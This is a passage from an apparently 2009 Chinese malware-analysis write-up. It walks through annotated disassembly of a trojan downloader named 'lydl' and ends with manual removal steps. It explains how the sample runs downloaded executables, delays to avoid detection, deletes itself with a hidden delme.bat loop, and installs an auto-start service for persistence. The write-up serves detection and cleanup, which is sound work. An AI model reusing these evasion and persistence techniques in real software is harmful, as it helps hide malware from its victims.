+  004073D3  |.  FFB5 F0FDFFFF   |push    dword ptr [ebp-210]  
+  004073D9  |.  68 EC744000     |push    004074EC                    ; \lydl\   这里是所创建的文件夹的名称  
+  004073DE  |.  68 FC744000     |push    004074FC                    ; lydl     这里是所下载的文件的名称  
+  004073E3  |.  8D95 ECFDFFFF   |lea     edx, dword ptr [ebp-214]  
+  004073E9  |.  8BC3             |mov     eax, ebx  
+  004073EB  |.  E8 4CFDFFFF     |call    0040713C  
+  004073F0  |.  FFB5 ECFDFFFF   |push    dword ptr [ebp-214]  
+  004073F6  |.  68 0C754000     |push    0040750C                    ; .exe  
+  004073FB  |.  8D85 F4FDFFFF   |lea     eax, dword ptr [ebp-20C]  
+  00407401  |.  BA 05000000     |mov     edx, 5  
+  00407406  |.  E8 B1C8FFFF     |call    00403CBC  
+  0040740B  |.  8B85 F4FDFFFF   |mov     eax, dword ptr [ebp-20C]  
+  00407411  |.  E8 E6C9FFFF     |call    00403DFC  
+  00407416  |.  50               |push    eax                          ; |CmdLine  
+  00407417  |.  E8 CCD6FFFFFF   |call    <jmp.&kernel32.WinExec>      ; \通过 WinExec 打开所下载的文件
+```
+
+
+
+```
+  0040741C  |.  68 F4010000      |push    1F4                           ; /Timeout = 500. ms  
+  00407421  |.  E8 3ADDFFFF      |call    <jmp.&kernel32.Sleep>         ; \\Sleep  
+  00407426  |.  8D95 E8FDFFFF    |lea     edx, dword ptr [ebp-218]      ;  Sleep 一下，免得被发现的太快了  
+  0040742C  |.  8B45 EC          |mov     eax, dword ptr [ebp-14]  
+  0040742F  |.  E8 9CEBFFFF      |call    00405FD0  
+  00407434  |.  8B85 E8FDFFFF    |mov     eax, dword ptr [ebp-218]  
+  0040743A  |.  E8 BDC9FFFF      |call    00403DFC  
+  0040743F  |.  50              |push    eax  
+  00407440  |.  6A 01           |push    1  
+  00407442  |.  8D95 E4FDFFFF    |lea     edx, dword ptr [ebp-21C]  
+  00407448  |.  8B45 F0          |mov     eax, dword ptr [ebp-10]  
+  0040744B  |.  E8 80EBFFFF      |call    00405FD0  
+  00407450  |.  8B85 E4FDFFFF    |mov     eax, dword ptr [ebp-21C]  
+  00407456  |.  E8 A1C9FFFF      |call    00403DFC  
+  0040745B  |.  8BC8            |mov     ecx, eax  
+  0040745D  |.  BA 14754000     |mov     edx, 00407514                 ;  software\\lydl  
+  00407462  |.  B8 02000080     |mov     eax, 80000002  
+  00407467  |.  E8 ECECFFFF     |call    00406158  
+  0040746C  |>  8BC6            mov     eax, esi  
+  0040746E  |.  E8 41B7FFFF     |call    00402BB4  
+  00407473  |.  E8 88B1FFFF     |call    00402600  
+  00407478  |.  84C0            |test    al, al  
+  0040747A  |.^ 0F84 F4FDFFFF   \\je      00407274                    
+  00407480  |.  8BC6            mov     eax, esi  
+  00407482  |.  E8 D5B6FFFF     call    00402B5C  
+  00407487  |.  E8 74B1FFFF     call    00402600  
+  0040748C  |.  33C0            xor     eax, eax  
+  0040748E  |.  5A             |pop     edx  
+  0040748F  |.  59             |pop     ecx  
+  00407490  |.  59             |pop     ecx  
+  00407491  |.  64:8910        |mov     dword ptr fs:[eax], edx  
+  00407494  |.  68 BE744000    |push    004074BE  
+  00407499  |>  8D85 E4FDFFFF  |lea     eax, dword ptr [ebp-21C]  
+  0040749F  |.  BA 0E000000    |mov     edx, 0E  
+  004074A4  |.  E8 F3C5FFFF    |call    00403A9C  
+  004074A9  |.  8D45 E8         |lea     eax, dword ptr [ebp-18]  
+  004074AC  |.  BA 06000000    |mov     edx, 6  
+  004074B1  |.  E8 E6C5FFFF    |call    00403A9C  
+  004074B6  \\.  C3            |retn  
+```
+
+`utf8.nls` 是一个字符集文件
+
+`F7` 跟进 `004073CE` 的 `call 00405684`
+
+```
+  00405684  /$  55              push    ebp  
+  00405685  |.  8BEC            mov     ebp, esp  
+  00405687  |.  81C4 F4FEFFFF   add     esp, -10C  
+  0040568D  |.  53              push    ebx  
+  0040568E  |.  56              push    esi  
+  0040568F  |.  33C9            xor     ecx, ecx  
+  00405691  |.  898D F4FEFFFF   mov     dword ptr [ebp-10C], ecx  
+  00405697  |.  898D F8FEFFFF   mov     dword ptr [ebp-108], ecx  
+  0040569D  |.  8BF2            mov     esi, edx  
+  0040569F  |.  8BD8            mov     ebx, eax  
+  004056A1  |.  33C0            xor     eax, eax  
+  004056A3  |.  55              push    ebp  
+  004056A4  |.  68 85574000    push    00405785  
+  004056A9  |.  64:FF30        push    dword ptr fs:[eax]  
+  004056AC  |.  64:8920        mov     dword ptr fs:[eax], esp  
+  004056AF  |.  8D85 FCFEFFFF  lea     eax, dword ptr [ebp-104]  
+  004056B5  |.  BA 04010000    mov     edx, 104  
+  004056BA  |.  E8 41F4FFFF    call    00404B00  
+  004056BF  |.  83EB 01        sub     ebx, 1                      ;  Switch (cases 0..2)  
+  004056C2  |.  72 0A          jb      short 004056CE  
+  004056C4  |.  74 43          je      short 00405709  
+  004056C6  |.  4B             dec     ebx  
+  004056C7  |.  74 7B          je      short 00405744  
+  004056C9  |.  E9 99000000    jmp     00405767  
+  004056CE  |>  68 04010000    push    104                         ; /BufSize = 104 (260.); Case 0 of switch 004056BF  
+  004056D3  |.  8D85 FCFEFFFF  lea     eax, dword ptr [ebp-104]     ; |  
+  004056D9  |.  50            push    eax                         ; |Buffer  
+  004056DA  |.  E8 99F3FFFF   call    <jmp.&kernel32.GetWindowsDirectoryA> ; \\GetWindowsDirectoryA  
+  004056DF  |.  8D85 F8FEFFFF lea     eax, dword ptr [ebp-108]     ;  通过 GetWindowsDirectory 获得 windows 所在目录  
+  004056E5  |.  8D95 FCFEFFFF lea     edx, dword ptr [ebp-104]  
+  004056EB  |.  B9 04010000   mov     ecx, 104  
+  004056F0  |.  E8 EFE4FFFF   call    00403BE4  
+  004056F5  |.  8B95 F8FEFFFF mov     edx, dword ptr [ebp-108]  
+  004056FB  |.  8BC6          mov     eax, esi  
+  004056FD  |.  B9 9C574000   mov     ecx, 0040579C                 ;  \\  
+  00405702  |.  E8 41E5FFFF   call    00403C48  
+  00405707  |.  EB 5E         jmp     short 00405767  
+  00405709  |>  68 04010000   push    104                         ; /BufSize = 104 (260.); Case 1 of switch 004056BF  
+  0040570E  |.  8D85 FCFEFFFF lea     eax, dword ptr [ebp-104]     ; |  
+  00405714  |.  50            push    eax                         ; |Buffer  
+  00405715  |.  E8 3EF3FFFF   call    <jmp.&kernel32.GetSystemDirectoryA> ; \\GetSystemDirectoryA  
+  0040571A  |.  8D85 F4FEFFFF lea     eax, dword ptr [ebp-10C]     ;  通过 GetSystemDirectory 获得 system 所在目录  
+  00405720  |.  8D95 FCFEFFFF lea     edx, dword ptr [ebp-104]  
+  00405726  |.  B9 04010000   mov     ecx, 104  
+  0040572B  |.  E8 B4E4FFFF   call    00403BE4  
+  00405730  |.  8B95 F4FEFFFF mov     edx, dword ptr [ebp-10C]  
+  00405736  |.  8BC6          mov     eax, esi  
+  00405738  |.  B9 9C574000   mov     ecx, 0040579C                 ;  \\  
+  0040573D  |.  E8 06E5FFFF   call    00403C48  
+  00405742  |.  EB 23         jmp     short 00405767  
+  00405744  |>  8D85 FCFEFFFF lea     eax, dword ptr [ebp-104]     ;  Case 2 of switch 004056BF  
+  0040574A  |.  50            push    eax                         ; /Buffer  
+  0040574B  |.  68 04010000   push    104                         ; |BufSize = 104 (260.)  
+  00405750  |.  E8 0BF3FFFF   call    <jmp.&kernel32.GetTempPathA> ; \\GetTempPathA  
+  00405755  |.  8BC6          mov     eax, esi                      ;  通过 GetTempPath 获得系统的 TEMP 文件夹的路径，然后会在该文件夹下面创建一个文件夹，所下载的一堆东西就在那个文件夹里面  
+  00405757  |.  8D95 FCFEFFFF lea     edx, dword ptr [ebp-104]  
+  0040575D  |.  B9 04010000   mov     ecx, 104  
+  00405762  |.  E8 7DE4FFFF   call    00403BE4  
+  00405767  |>  33C0          xor     eax, eax                      ;  Default case of switch 004056BF  
+  00405769  |.  5A            pop     edx  
+  0040576A  |.  59            pop     ecx  
+  0040576B  |.  59            pop     ecx  
+  0040576C  |.  64:8910       mov     dword ptr fs:[eax], edx  
+  0040576F  |.  68 8C574000   push    0040578C  
+  00405774  |>  8D85 F4FEFFFF lea     eax, dword ptr [ebp-10C]  
+  0040577A  |.  BA 02000000   mov     edx, 2  
+  0040577F  |.  E8 18E3FFFF   call    00403A9C  
+  00405784  \\.  C3            retn  
+```
+
+跟进 `00407915` 的 `call 004058AC`
+
+```
+  004058DA  |.  64:FF30        push    dword ptr fs:[eax]  
+  004058DD  |.  64:8920        mov     dword ptr fs:[eax], esp  
+  004058E0  |.  8D45 FC         lea     eax, dword ptr [ebp-4]  
+```
+
+
+
+### 删除自身代码段
+
+```
+004058E3  |.  BA 2C5A4000       mov     edx, 00405A2C                         ;  delme.bat  
+004058E8  |.  E8 23E2FFFF      call    00403B10  
+004058ED  |.  8B55 FC          mov     edx, dword ptr [ebp-4]  
+004058F0  |.  8D85 30FEFFFF    lea     eax, dword ptr [ebp-1D0]  
+004058F6  |.  E8 A5D1FFFF      call    00402AA0  
+004058FB  |.  8D85 30FEFFFF    lea     eax, dword ptr [ebp-1D0]  
+00405901  |.  E8 36CFFFFF      call    0040283C  
+00405906  |.  E8 F5CCFFFF      call    00402600  
+0040590B  |.  BA 405A4000      mov     edx, 00405A40                         ;  :try  
+00405910  |.  8D85 30FEFFFF    lea     eax, dword ptr [ebp-1D0]  
+00405916  |.  E8 75E6FFFF      call    00403F90  
+0040591B  |.  E8 A4D6FFFF      call    00402FC4  
+00405920  |.  E8 DBCCFFFF      call    00402600  
+00405925  |.  68 505A4000      push    00405A50                              ;  del "  
+0040592A  |.  8D95 28FEFFFF    lea     edx, dword ptr [ebp-1D8]  
+00405930  |.  33C0             xor     eax, eax  
+00405932  |.  E8 25CEFFFF      call    0040275C  
+00405937  |.  FFB5 28FEFFFF    push    dword ptr [ebp-1D8]  
+0040593D  |.  68 605A4000      push    00405A60                              ;  "  
+00405942  |.  8D85 2CFEFFFF    lea     eax, dword ptr [ebp-1D4]  
+00405948  |.  BA 03000000      mov     edx, 3  
+0040594D  |.  E8 6AE3FFFF      call    00403CBC  
+00405952  |.  8B95 2CFEFFFF    mov     edx, dword ptr [ebp-1D4]  
+00405958  |.  8D85 30FEFFFF    lea     eax, dword ptr [ebp-1D0]  
+0040595E  |.  E8 2DE6FFFF      call    00403F90  
+00405963  |.  E8 5CD6FFFF      call    00402FC4  
+00405968  |.  E8 93CCFFFF      call    00402600  
+0040596D  |.  68 6C5A4000      push    00405A6C                              ;  if exist "  
+00405972  |.  8D95 20FEFFFF    lea     edx, dword ptr [ebp-1E0]  
+00405978  |.  33C0             xor     eax, eax  
+0040597A  |.  E8 DDCEFFFF      call    0040275C  
+0040597F  |.  FFB5 20FEFFFF    push    dword ptr [ebp-1E0]  
+00405985  |.  68 605A4000      push    00405A60                              ;  "  
+0040598A  |.  68 805A4000      push    00405A80                              ;   goto try  
+0040598F  |.  8D85 24FEFFFF    lea     eax, dword ptr [ebp-1DC]  
+00405995  |.  BA 04000000      mov     edx, 4  
+0040599A  |.  E8 1DE3FFFF      call    00403CBC  
+0040599F  |.  8B95 24FEFFFF    mov     edx, dword ptr [ebp-1DC]  
+004059A5  |.  8D85 30FEFFFF    lea     eax, dword ptr [ebp-1D0]  
+004059AB  |.  E8 E0E5FFFF      call    00403F90  
+004059B0  |.  E8 0FD6FFFF      call    00402FC4  
+004059B5  |.  E8 46CCFFFF      call    00402600  
+004059BA  |.  BA 945A4000      mov     edx, 00405A94                         ;  del %0  
+004059BF  |.  8D85 30FEFFFF    lea     eax, dword ptr [ebp-1D0]  
+004059C5  |.  E8 C6E5FFFF      call    00403F90  
+004059CA  |.  E8 F5D5FFFF      call    00402FC4  
+004059CF  |.  E8 2CCCFFFF      call    00402600  
+004059D4  |.  8D85 30FEFFFF    lea     eax, dword ptr [ebp-1D0]  
+004059DA  |.  E8 7DD1FFFF      call    00402B5C  
+004059DF  |.  E8 1CCCFFFF      call    00402600  
+004059E4  |.  6A 00            push    0                                     ; /ShowState = SW_HIDE  
+004059E6  |.  68 9C5A4000      push    00405A9C                              ; |delme.bat  
+004059EB  |.  E8 F8F0FFFF      call    <jmp.&kernel32.WinExec>               ; \WinExec  
+```
+
+以上代码是通过调用一个批处理文件来删除木马自身的，批处理的文件名字是：`delme.bat`。
+
+### 服务创建与启动代码段
+
+```
+004057DC   $  55                push    ebp  
+004057DD   .  8BEC             mov     ebp, esp  
+004057DF   .  83C4 F4          add     esp, -0C  
+004057E2   .  53               push    ebx  
+004057E3   .  56               push    esi  
+004057E4   .  894D FC          mov     dword ptr [ebp-4], ecx  
+004057E7   .  8BF2             mov     esi, edx  
+004057E9   .  8BD8             mov     ebx, eax  
+004057EB   .  8B45 FC          mov     eax, dword ptr [ebp-4]  
+004057EE   .  E8 F9E5FFFF      call    00403DEC  
+004057F3   .  33C0             xor     eax, eax  
+004057F5   .  55               push    ebp  
+004057F6   .  68 9F584000      push    0040589F  
+004057FB   .  64:FF30         push    dword ptr fs:[eax]  
+004057FE   .  64:8920         mov     dword ptr fs:[eax], esp  
+00405801   .  68 3F000F00     push    0F003F  
+00405806   .  6A 00            push    0  
+00405808   .  6A 00            push    0  
+0040580A   .  E8 2DFEFFFF      call    <jmp.&advapi32.OpenSCManagerA>  
+0040580F   .  8945 F8          mov     dword ptr [ebp-8], eax  
+00405812   .  837D F8 00      cmp     dword ptr [ebp-8], 0  
+00405816   .  74 71            je      short 00405889  
+00405818   .  33C0             xor     eax, eax  
+0040581A   .  55               push    ebp  
+0040581B   .  68 82584000      push    00405882  
+00405820   .  64:FF30         push    dword ptr fs:[eax]  
+00405823   .  64:8920         mov     dword ptr fs:[eax], esp  
+00405826   .  6A 00            push    0  
+00405828   .  6A 00            push    0  
+0040582A   .  6A 00            push    0  
+0040582C   .  6A 00            push    0  
+0040582E   .  6A 00            push    0  
+00405830   .  8B45 FC          mov     eax, dword ptr [ebp-4]  
+00405833   .  E8 C4E5FFFF      call    00403DFC  
+00405838   .  50               push    eax                                   ; |BinaryPathName  
+00405839   .  6A 00            push    0                                     ; |ErrorControl = SERVICE_ERROR_IGNORE  
+0040583B   .  6A 02            push    2                                     ; |StartType = SERVICE_AUTO_START  
+0040583D   .  68 10010000      push    110                                   ; |ServiceType = SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS  
+00405842   .  68 FF010F00      push    0F01FF                                ; |DesiredAccess = SERVICE_ALL_ACCESS  
+00405847   .  56               push    esi                                   ; |DisplayName  
+00405848   .  53               push    ebx                                   ; |ServiceName  
+00405849   .  8B45 F8          mov     eax, dword ptr [ebp-8]                ; |  
+0040584C   .  50               push    eax                                   ; |hManager  
+0040584D   .  E8 E2FDFFFF      call    <jmp.&advapi32.CreateServiceA>        ; \CreateServiceA  
+00405852   .  8BD8             mov     ebx, eax  
+00405854   .  33C0             xor     eax, eax  
+00405856   .  8945 F4          mov     dword ptr [ebp-C], eax  
+00405859   .  8D45 F4          lea     eax, dword ptr [ebp-C]  
+0040585C   .  50               push    eax  
+0040585D   .  6A 00            push    0  
+0040585F   .  53               push    ebx  
+00405860   .  E8 DFFDFFFF      call    <jmp.&advapi32.StartServiceA>  
+00405865   .  53               push    ebx  
+00405866   .  E8 C1FDFFFF      call    <jmp.&advapi32.CloseServiceHandle>  
+0040586B   .  33C0             xor     eax, eax  
+0040586D   .  5A               pop     edx  
+0040586E   .  59               pop     ecx  
+0040586F   .  59               pop     ecx  
+00405870   .  64:8910         mov     dword ptr fs:[eax], edx  
+00405873   .  68 89584000      push    00405889  
+00405878   >  8B45 F8          mov     eax, dword ptr [ebp-8]  
+0040587B   .  50               push    eax  
+0040587C   .  E8 ABFDFFFF      call    <jmp.&advapi32.CloseServiceHandle>  
+00405881   .  C3               retn  
+```
+
+以上代码是 `00407910` 的 `call 004057DC`，即创建一个服务然后启动，以达到木马开机自启动的目的，随后执行关闭句柄的操作。
+
+
+
+# 手动删除方法
+
+1. 在注册表中删除 `HKEY_LOCAL_MACHINE\software\lydl`；
+2. 在 `C:\WINDOWS\Temp` 下删除 `lydl` 文件夹及此文件夹里所有文件；//这个要看你的操作系统装在哪个盘了
+3. 在 `C:\WINDOWS\system32` 下删除 `lydl.exe` 文件；//这个要看你的操作系统装在哪个盘了
+
+---
+
+## 版权声明
+
+本文纯属技术交流，转载请注明作者并保持文章的完整，谢谢！
+
+2009 年 02 月 17 日 下午 10:47:46
